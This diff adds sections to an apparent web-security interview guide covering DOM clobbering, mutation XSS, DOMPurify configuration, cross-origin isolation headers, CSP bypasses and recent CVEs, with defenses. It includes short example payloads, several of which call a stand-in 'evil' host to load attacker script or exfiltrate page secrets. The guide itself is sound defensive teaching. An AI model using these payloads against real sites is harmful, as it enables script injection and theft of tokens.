@@ -486,6 +486,351 @@ ever seeing the cookie. It also does nothing for tokens stored in `localStorage`
 > fix is preventing XSS (output encoding, CSP, Trusted Types). Treat HttpOnly as one layer,
 > and never store session tokens somewhere JS can read them if you can avoid it.
 
+## DOM Clobbering
+
+**DOM clobbering** is a scriptless injection technique: when an attacker can inject
+*named* HTML (elements with `id` or `name` attributes) but **cannot** inject `<script>` or
+event handlers (a sanitizer stripped them), they abuse a legacy DOM behavior — named
+elements are exposed as properties on `document`, `window`, and their parent form/collection
+— to **overwrite JavaScript variables, globals, and object properties** with element
+references. This turns an HTML-only injection into a logic-corruption primitive that can
+defeat security checks or hijack script URLs, all without executing any injected script.
+
+Classic vectors:
+- `<a id=x>` makes `window.x` resolve to that anchor element. Two same-`id` anchors form a
+  collection, and a nested `name` lets you reach a *property*: `<a id=x><a id=x name=url
+  href="//evil/e.js">` makes `window.x.url` a string-coercible value the attacker controls.
+  If code does `var s = document.createElement('script'); s.src = window.x.url` you now
+  control a script source **on an allowlisted, nonced page** — a CSP bypass.
+- `<form><input id=attributes>` clobbers `form.attributes` (normally a `NamedNodeMap`), so a
+  sanitizer loop like `for (const a of node.attributes)` throws or misbehaves — a way to
+  **defeat filter code**.
+- Clobbering `document.body`, `document.getElementById`, or config globals a page reads with
+  the `var x = window.x || {}` idiom (the injected element wins over the undefined global).
+
+Defenses (OWASP DOM Clobbering Prevention Cheat Sheet):
+- Verify types before trusting DOM lookups: `if (!(node.attributes instanceof NamedNodeMap))
+  throw`; check `typeof x === 'expected'`.
+- Don't rely on named-property access for security-relevant values; use explicit
+  `document.getElementById` results and validate them.
+- Sanitize with DOMPurify's default `SANITIZE_DOM` plus `SANITIZE_NAMED_PROPS: true`, which
+  prefixes `id`/`name` values with `user-content-` so injected names can't collide with real
+  properties. Ban `id`/`name` on untrusted HTML where feasible.
+- Freeze critical globals; use scoped variables/modules instead of `window`-level config.
+
+> [!INTERVIEW]
+> "The sanitizer strips `<script>` and every `on*` handler — you can only inject plain tags
+> with `id`/`name`. Get code execution." Answer: **DOM clobbering** — inject
+> `<a id=x><a id=x name=url href=//evil/x.js>` (or clobber `document.currentScript.src`
+> style flows / a `base`-relative loader) so a legitimate script picks up your URL, or
+> clobber `attributes`/a config global to bypass a check. It's the canonical "no script
+> injection — now what?" senior question.
+
+## Mutation XSS (mXSS) Internals
+
+**Mutation XSS (mXSS)** exploits the fact that the browser's HTML parser is *not*
+idempotent: when you assign a string to `innerHTML`, the browser parses it, and when that
+subtree is later **re-serialized and re-parsed** (or normalized on insertion), the markup
+can *mutate* into a different, executable shape. A sanitizer that inspected the string (or
+even a parsed tree) *before* this mutation approves markup that becomes dangerous *after*
+it. This is precisely why "never write your own sanitizer" and "sanitization is not
+idempotent — don't re-serialize sanitizer output" are true.
+
+The main mutation engines:
+- **Foreign-content namespace confusion.** HTML, SVG, and MathML have different parsing
+  rules, and "integration points" switch the parser between them. Inside `<svg>`,
+  `<math>`, or `<annotation-xml encoding="text/html">`, elements like `<style>`, `<mtext>`,
+  `<title>`, or `<textarea>` are parsed differently than in HTML; re-serialization can move
+  content across the boundary so that what was inert CDATA/text becomes live HTML. Payloads
+  built around `<svg><style>...`, `<math><mtext><table>...`, and
+  `<annotation-xml encoding="text/html">` are the classic mXSS engines.
+- **Rawtext / escapable-rawtext breakouts** (`<noscript>`, `<style>`, `<title>`,
+  `<textarea>`, `<xmp>`) where the parser's tokenizer state differs from the sanitizer's
+  assumptions.
+- **`<template>`** content lives in an inert document fragment; moving it into the live DOM
+  can re-interpret it.
+- DOM **normalization** (adding implied `<tbody>`, closing tags, entity decoding) reshaping
+  the tree on reinsertion.
+
+The current reference is Mizu's 2024 "Exploring the DOMPurify library: Bypasses and Fixes"
+(PortSwigger's Top 10 Web Hacking Techniques of 2024, #5), which chained namespace-confusion
+mutations to bypass then-current DOMPurify. Historic groundwork is Heiderich et al.'s mXSS
+papers and the cure53 DOMPurify security wiki.
+
+Defenses: use a **maintained** sanitizer and keep it patched (mXSS bypasses are found and
+fixed regularly — patch hygiene is the control); sanitize **once** and never mutate the
+string afterward; prefer Trusted Types so raw strings can't reach `innerHTML` at all; and
+avoid round-tripping sanitized HTML through `innerHTML`/`outerHTML` again.
+
+> [!WARNING]
+> Re-sanitizing or "cleaning up" HTML *after* DOMPurify (e.g. string-replacing, appending,
+> or re-parsing its output) can **void** the sanitization — the post-processing may re-open
+> a mutation the sanitizer had neutralized. Assign the sanitizer's output straight to the
+> sink (ideally as a `TrustedHTML`) with no further edits.
+
+## Configuring an HTML Sanitizer (DOMPurify)
+
+Knowing *that* you should use DOMPurify is junior-level; configuring it correctly is the
+senior bar. Key knobs (client-side DOMPurify):
+- `ALLOWED_TAGS` / `ALLOWED_ATTR` — explicit allowlists; `FORBID_TAGS` / `FORBID_ATTR`
+  subtract from defaults. Prefer a tight allowlist over blocklists.
+- `USE_PROFILES: { html: true }` (or `svg`/`mathML`) — enabling a profile **overrides**
+  `ALLOWED_TAGS`, a common footgun when you also try to set `ALLOWED_TAGS`.
+- `RETURN_TRUSTED_TYPE: true` — returns a `TrustedHTML` object for Trusted Types
+  integration. DOMPurify then auto-creates a Trusted Types policy named `dompurify`, which
+  **must be listed** in your CSP `trusted-types` directive or the call throws.
+- `SANITIZE_NAMED_PROPS: true` — namespaces `id`/`name` (`user-content-` prefix) to kill DOM
+  clobbering.
+- Hooks (`addHook('uponSanitizeElement', …)`) for custom element/attribute policy.
+
+Operational pitfalls:
+- **Don't modify HTML after sanitizing** (see mXSS warning above) — it voids the guarantee.
+- **Server-side rendering:** DOMPurify needs a DOM. With `jsdom` you must keep it patched
+  (it has had its own bypasses); **`happy-dom` is not safe** for sanitization. Prefer a
+  browser/`jsdom` build and pin versions.
+- `SAFE_FOR_XML` defaults to `true`; setting it `false`, or sanitizing for a non-HTML
+  context (e.g. output later placed in XML/XHTML) without matching config, can reintroduce
+  XSS.
+- Use `USE_PROFILES`/`ALLOWED_URI_REGEXP` to constrain `href`/`src` schemes; DOMPurify
+  blocks `javascript:` by default but confirm your config didn't loosen it.
+
+> [!KEY-TAKEAWAY]
+> "Just call `DOMPurify.sanitize(x)`" is incomplete. The senior answer names a tight
+> allowlist, `RETURN_TRUSTED_TYPE` wired to a CSP `trusted-types dompurify` entry,
+> `SANITIZE_NAMED_PROPS` for clobbering, a patched DOM implementation server-side, and the
+> rule that sanitizer output is never post-processed.
+
+## Cross-Origin Isolation: COOP, COEP, and CORP
+
+Three response headers harden the boundary between your document and other origins,
+defeating Spectre-style side channels, cross-site leaks (XS-Leaks), and cross-site script
+inclusion (XSSI).
+
+- **`Cross-Origin-Opener-Policy` (COOP)** — controls whether a document shares a browsing-
+  context group with pages that open it or that it opens.
+  - `unsafe-none` (default), `same-origin-allow-popups`, `same-origin`.
+  - `COOP: same-origin` **severs `window.opener`**, so a page you `window.open()` (or that
+    opened you) cannot reach back into your window — this closes reverse-tabnabbing and many
+    XS-Leaks and cross-window scripting paths.
+- **`Cross-Origin-Embedder-Policy` (COEP)** — `require-corp` or `credentialless` forces
+  every cross-origin subresource to explicitly opt in (via CORP/CORS) before it can be
+  embedded.
+- **`Cross-Origin-Resource-Policy` (CORP)** — a *per-resource* header
+  (`same-origin` | `same-site` | `cross-origin`) that says who may embed *this* response.
+  `CORP: same-origin` blocks other sites from loading your resource into `<img>`/`<script>`
+  etc., mitigating XSSI and side-channel leaks.
+
+**Crossorigin isolation:** serving `COOP: same-origin` **and** `COEP: require-corp` makes
+`self.crossOriginIsolated === true`, which **re-enables** the high-precision capabilities
+browsers locked down after Spectre: `SharedArrayBuffer`, unthrottled `performance.now()`,
+and `performance.measureUserAgentSpecificMemory()`. These are the primary reason to adopt
+COOP+COEP beyond hardening.
+
+> [!INTERVIEW]
+> "Name security headers beyond CSP that mitigate Spectre / cross-origin leaks." COOP
+> (`same-origin` — isolate the browsing-context group, kill `window.opener`), COEP
+> (`require-corp` — require opt-in for embeds), and CORP (`same-origin` per resource).
+> COOP+COEP together grant cross-origin isolation and unlock `SharedArrayBuffer`.
+
+## Advanced CSP Source Expressions
+
+Beyond `'unsafe-inline'`, nonces, hashes, and `'strict-dynamic'`, CSP Level 3 adds finer
+controls interviewers probe:
+
+- **`'unsafe-hashes'`** — allows specific **inline event-handler / style attributes**
+  (`onclick="…"`, `style="…"`) to run *by hash*, without enabling all inline script:
+  `script-src 'unsafe-hashes' 'sha256-…'`. It is the correct (least-bad) answer to "I have
+  one legacy `onclick` I can't remove under strict CSP." The trap: it is strictly weaker
+  than removing the handler and does **not** equal `'unsafe-inline'` — it only whitelists the
+  exact hashed handler bodies. Prefer refactoring the handler out entirely.
+- **`script-src-elem` vs `script-src-attr`** — `-elem` governs `<script>` *elements* (inline
+  blocks and `src` loads); `-attr` governs inline event-handler *attributes*. Likewise
+  **`style-src-elem`** (`<style>`/`<link rel=stylesheet>`) vs **`style-src-attr`** (inline
+  `style=` attributes). If unset they fall back to `script-src`/`style-src`, then
+  `default-src`. This granularity lets you, e.g., allow nonced `<script>` elements while
+  fully banning inline handlers with `script-src-attr 'none'`.
+
+> [!TIP]
+> `script-src-attr 'none'` is a clean way to guarantee **no** inline event handlers run,
+> independent of how `script-src` is configured — a strong hardening add for apps migrating
+> off legacy `onclick=` markup.
+
+## CSP Bypasses: Dangling Markup, Policy Injection, and Script Gadgets
+
+A CSP can pass `csp-evaluator` and still be bypassable. Senior candidates should name the
+mechanisms:
+
+- **Script gadgets** (Lekies et al., "Code-Reuse Attacks for the Web," 2017). Legitimate
+  code already loaded from an allowed/nonced/`strict-dynamic`-trusted origin turns benign
+  *injected HTML* into execution. Examples: a **JSONP** endpoint (`?callback=alert(1)`) on an
+  allowlisted CDN; **AngularJS** template-expression evaluation
+  (`{{constructor.constructor('alert(1)')()}}`) or auto-init via `ng-app`; any framework that
+  scans the DOM for markup it will "activate." Gadgets defeat allowlist CSP *and* even
+  survive some sanitizers (the injected markup contains no script — the gadget supplies it).
+  This is the deeper "why allowlists are dead → use `strict-dynamic`" reason, and why even
+  `strict-dynamic` bundles must be gadget-audited.
+- **Dangling-markup injection / exfiltration.** When CSP blocks script but allows
+  `img-src`/`connect-src`, an attacker injects an *unterminated* tag —
+  `<img src='//evil/log?` or a dangling `<a href>`/`<link>` — so the browser treats the rest
+  of the page (CSRF tokens, secrets, nonces) as the attribute value and **sends it to the
+  attacker host** when it fetches the resource. CSP alone doesn't stop this; `img-src 'self'`
+  helps but other vectors (anchors, `<meta http-equiv=refresh>`, `<link>` prefetch) remain.
+  The real fix is fixing the HTML injection.
+- **CSP policy injection.** If reflected user input lands *inside the CSP header itself*, an
+  attacker appends a directive that overrides the intended one — e.g. injecting
+  `; script-src-elem 'unsafe-inline'` overrides the base `script-src` and re-enables inline
+  script. Never build CSP from untrusted input.
+- **DOM-clobbering `base-uri`.** If `base-uri 'none'` is missing, an injected `<base
+  href="//evil/">` rewrites relative URLs — including a nonced but relatively-referenced
+  `<script src="app.js">` — to load the attacker's file with the page's trust. This is why
+  `base-uri 'none'` is a required hardening directive.
+
+> [!INTERVIEW]
+> "This CSP scores well in csp-evaluator but is still bypassable — how?" Strong answers:
+> script gadgets on `strict-dynamic`-trusted bundles (JSONP/AngularJS), a missing
+> `base-uri 'none'` enabling `<base>` hijack of relative nonced scripts, or dangling-markup
+> exfiltration through an allowed `img-src`/`connect-src`. CSP is mitigation, not a cure for
+> the injection.
+
+## sandbox, upgrade-insecure-requests, and Mixed Content
+
+- **`Content-Security-Policy: sandbox`** applies iframe-style sandboxing to the *response
+  itself*. An empty `sandbox` (no tokens) is maximum restriction — the document runs as an
+  opaque, unique origin with scripts, forms, popups, and same-origin access disabled. Add
+  tokens back as needed: `allow-scripts`, `allow-forms`, `allow-popups`, `allow-same-origin`,
+  `allow-modals`, etc. Use it to serve untrusted content (user uploads, previews,
+  attachments) with minimal capability. Note `allow-scripts` + `allow-same-origin` together
+  lets the content remove its own sandbox, so avoid granting both to untrusted docs.
+- **`upgrade-insecure-requests`** (valueless directive) tells the browser to auto-upgrade
+  `http://` subresource and same-origin navigation URLs to `https://` before fetching. It
+  fixes mixed-content breakage during an HTTPS migration but is **not** a substitute for
+  HSTS: it doesn't upgrade cross-origin top-level navigations and offers no protection if the
+  attacker controls the network for the first request.
+- **`block-all-mixed-content`** (deprecated in favor of upgrade) blocked all mixed content.
+  Modern browsers auto-block active mixed content regardless.
+
+## Modern Reporting API: Reporting-Endpoints and NEL
+
+CSP reporting has modernized. `Report-To` is superseded by the **`Reporting-Endpoints`**
+response header (Reporting API v1), referenced from CSP by the **`report-to <group>`**
+directive:
+```
+Reporting-Endpoints: csp-endpoint="https://example.com/csp"
+Content-Security-Policy: script-src 'nonce-…'; report-to csp-endpoint
+```
+`report-uri` is deprecated in CSP3 but still honored, so pages often send **both**
+`report-uri` and `report-to` for coverage. The **`'report-sample'`** source keyword tells
+the browser to include a short snippet of the offending inline script in the violation
+report (helps triage). **NEL (Network Error Logging)** is the sibling mechanism that reports
+network-layer failures (DNS, TLS, connection) via the same Reporting API endpoints.
+
+## JavaScript and JSON Context Escaping
+
+Encoding rules inside a `<script>` block are stricter than the summary table implies:
+- Inside a quoted JS string literal, escape with **`\uXXXX`** (Unicode) or `\xHH`, and
+  **crucially also encode `<`, `>`, and `&`**. The reason: the HTML parser runs *before* the
+  JS lexer, so a literal `</script>` inside your string still **terminates the script
+  element** (`</script>` → `<\/script>` or `</script>`), and `<!--`/`<script` sequences
+  trigger legacy comment/script-data parsing quirks. Backslash-escaping only the quotes is
+  insufficient.
+- Prefer emitting data **not** as a raw JS literal at all: serialize as JSON and read it via
+  `JSON.parse('…')`, or stash it in a `data-*` attribute / a
+  `<script type="application/json">` island and parse it with safe DOM APIs.
+- **JSON embedded in HTML `<script>`:** HTML-encode `<`, `>`, `&`, and the JS-invalid line
+  terminators **U+2028 / U+2029** (`<`, ` `, …). U+2028/U+2029 are valid in JSON
+  but were illegal in JS string literals pre-ES2019 and still break older parsers, and `<`
+  enables `</script>` breakout.
+- **XSSI / JSON hijacking:** top-level JSON *arrays* were historically executable via
+  `<script>` include + overridden `Array` constructor; APIs prepend an anti-hijacking prefix
+  like `)]}',\n` or `while(1);` (stripped client-side) and require `nosniff` + correct
+  `Content-Type` to prevent cross-origin script inclusion of JSON.
+
+> [!WARNING]
+> HTML-encoding a value that lands inside `<script>var x='…'</script>` does **not** make it
+> safe — the value is in a JS string context, not an HTML context. The `</script>` closing
+> sequence and unescaped quotes/backslashes remain breakout vectors. Emit via `JSON.parse`
+> or a data island instead of hand-escaping into a script literal.
+
+## Nonces, Caching, and CDN Interaction
+
+Nonces and full-page caching are fundamentally at odds. A CSP nonce must be **fresh and
+unpredictable per response**; if a full HTML page (header + inline `<script nonce>`) is
+cached by a CDN and served to many users, the "nonce" is now static and public — an
+attacker reads it from the cached HTML and reuses it, making the policy worthless.
+Resolutions:
+- **Edge/middleware nonce injection:** generate the nonce at the edge per request and
+  rewrite both the header and the tags (some CDNs/edge workers support this).
+- **Hash-based CSP** for static/cacheable pages: pin the exact inline script bytes with
+  `'sha256-…'` — no per-request state, cache-friendly.
+- Avoid naïve middleware that stamps a nonce onto **every** `<script>` in the output,
+  including ones built from user data — that would re-bless an injected script. Nonces must
+  be applied only to *known-trusted* server-authored tags.
+
+> [!KEY-TAKEAWAY]
+> Nonce CSP ⇒ per-response dynamic HTML; cached/static/CDN-served HTML ⇒ hash CSP (or
+> per-request edge nonce injection). A cached nonce is a reused nonce, and a reused nonce is
+> no protection at all.
+
+## Self-XSS, javascript:/data: URLs, and Reverse Tabnabbing
+
+- **Self-XSS** is social engineering, not a code flaw: the attacker tricks a user into
+  pasting attacker-supplied JavaScript into their own DevTools console ("paste this to unlock
+  a feature"). It runs in the victim's session but there is no injection point in the app, so
+  **output encoding cannot fix it** — browsers now print a large console warning, and the
+  defenses are user education, framing/UX, and not exposing "paste code here" affordances.
+- **`javascript:` and `data:` URLs.** Assigning a `javascript:` (or in some sinks a
+  `data:text/html`) URL to `href`/`src`/`location`/`window.open` executes script. Frameworks
+  don't fully protect this: React, for instance, "cannot handle `javascript:` URLs without
+  specialized validation." Fix by **scheme-allowlisting** URL attributes — permit only
+  `https:`/`http:`/`mailto:`/relative and reject everything else *before* it reaches the
+  attribute.
+- **Reverse tabnabbing.** A link with `target="_blank"` gives the opened page a live
+  `window.opener` it can use to redirect your tab to a phishing page. Add
+  `rel="noopener noreferrer"` (modern browsers imply `noopener` for `target="_blank"`, but
+  set it explicitly) — or, at the document level, `Cross-Origin-Opener-Policy: same-origin`.
+
+## DoubleClickjacking and the Limits of Framing Defenses
+
+`frame-ancestors`/`X-Frame-Options` stop an attacker from *framing* your site, and SameSite
+cookies blunt cross-site request forgery — but neither is a complete clickjacking answer.
+**DoubleClickjacking** (Paulos Yibelo, 2024) is a UI-redressing variant that **bypasses
+frame-busting and SameSite** by exploiting the timing between a rapid double-click and a
+window swap: the attacker opens a popup, and between the user's `mousedown`/`mouseup` events
+closes it and swaps the underlying (already-authenticated, top-level, *unframed*) target
+window under the second click — so the victim's second click lands on a sensitive control
+(OAuth "Authorize," "Delete account"). Because the target is a top-level window (not an
+iframe) and the navigation is a same-site top-level context, `frame-ancestors` and SameSite
+don't engage.
+
+Mitigations go beyond framing headers: disable security-critical buttons until a gesture/
+short delay after focus, require an explicit non-double-click confirmation for high-value
+actions, and use COOP to sever `window.opener`.
+
+## Notable CVEs and Incidents
+
+- **CVE-2024-4367 — PDF.js arbitrary JS execution.** A missing type check in Mozilla's
+  widely-embedded `pdf.js` let a crafted font (`glyf`/font-matrix field) execute arbitrary
+  JavaScript in the origin embedding the viewer. It illustrates **second-order / supply-chain
+  XSS**: a vulnerability in an embedded rendering library becomes XSS in *your* app, and
+  patch hygiene / dependency scanning is the control. (PortSwigger Top 10 2024, #7.)
+- **DOMPurify version-specific mXSS bypasses.** Recurring namespace-confusion bypasses
+  (Mizu 2024 and predecessors) are fixed release-by-release — the lesson is pin-and-patch,
+  not "DOMPurify is bulletproof."
+- **DoubleClickjacking** (2024) — see above; PortSwigger Top 10 2024 #6.
+- **Samy worm** (MySpace, 2005) — the canonical self-propagating stored-XSS worm; ~1M
+  profiles in ~20 hours, driven by a CSS/JS filter bypass and an XHR that reposted the
+  payload.
+- **AngularJS/JSONP gadget CVEs** on allowlisted CDNs — the empirical basis for the "CSP Is
+  Dead" allowlist critique.
+
+> [!INTERVIEW]
+> "Strict CSP is deployed, but the React SPA reads a bearer token from `localStorage` — does
+> CSP save you?" No. CSP restricts script *sources/execution*; it does not stop DOM-XSS from
+> reading same-origin `localStorage` (you'd need Trusted Types to close the DOM sinks), and
+> `connect-src 'self'` won't stop exfiltration routed through your own origin (open redirect,
+> a gadget, or the token echoed to a same-origin endpoint the attacker controls output of).
+> This is the crux of the HttpOnly-cookie vs `localStorage` token debate.
+
 ## Common follow-up questions
 
 - **"Walk me through fixing a reflected XSS in a search box."** Identify the sink (value
@@ -514,6 +859,18 @@ ever seeing the cookie. It also does nothing for tokens stored in `localStorage`
 - **"What is mutation XSS (mXSS)?"** Sanitized HTML that the browser's parser mutates on
   reinsertion into a form that becomes executable — why you use a maintained sanitizer,
   not regexes.
+- **"The sanitizer strips `<script>` and all handlers — get code execution."** DOM
+  clobbering (inject `id`/`name` to hijack a script `src` or a config global) or mXSS via
+  SVG/MathML namespace confusion.
+- **"Which headers give cross-origin isolation, and what do they unlock?"** COOP
+  `same-origin` + COEP `require-corp` ⇒ `crossOriginIsolated` ⇒ `SharedArrayBuffer` and
+  high-res timers; CORP guards each resource against cross-site embedding.
+- **"One legacy `onclick` must stay under strict CSP — how?"** `'unsafe-hashes'` with the
+  handler's hash (weaker than removing it; refactor it out when you can).
+- **"CSP blocks script but you can still exfiltrate the CSRF token — how?"**
+  Dangling-markup injection to an allowed `img-src`/`connect-src` host.
+- **"Nonce vs cached CDN pages?"** A cached nonce is reusable and worthless; use hash-based
+  CSP or per-request edge nonce injection.
 
 ## References
 
@@ -534,3 +891,15 @@ ever seeing the cookie. It also does nothing for tokens stored in `localStorage`
 - MDN — Permissions-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
 - MDN — X-Content-Type-Options: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
 - W3C Reporting API / report-to: https://www.w3.org/TR/reporting-1/
+- OWASP Cheat Sheet — DOM Clobbering Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
+- OWASP ASVS v4/v5 — V5 Validation, Sanitization & Encoding; V14 Configuration: https://owasp.org/www-project-application-security-verification-standard/
+- Lekies, Kotowicz et al., "Code-Reuse Attacks for the Web / Script Gadgets" (ACM CCS 2017): https://research.google/pubs/pub46215/
+- Mizu, "Exploring the DOMPurify library: Bypasses and Fixes" (2024): https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
+- cure53 DOMPurify (security wiki, mXSS): https://github.com/cure53/DOMPurify
+- Heiderich et al., mXSS research ("mXSS Attacks: Attacking well-secured Web-Applications", CCS 2013): https://cure53.de/fp170.pdf
+- Paulos Yibelo, "DoubleClickjacking" (2024): https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html
+- CVE-2024-4367 — PDF.js arbitrary JavaScript execution: https://nvd.nist.gov/vuln/detail/CVE-2024-4367
+- MDN — Cross-Origin-Opener-Policy / Embedder-Policy / Resource-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy
+- MDN — Cross-origin isolation / crossOriginIsolated: https://developer.mozilla.org/en-US/docs/Web/API/Window/crossOriginIsolated
+- W3C Fetch Standard (CORP): https://fetch.spec.whatwg.org/
+- WHATWG HTML — COOP/COEP: https://html.spec.whatwg.org/multipage/browsers.html#cross-origin-opener-policies
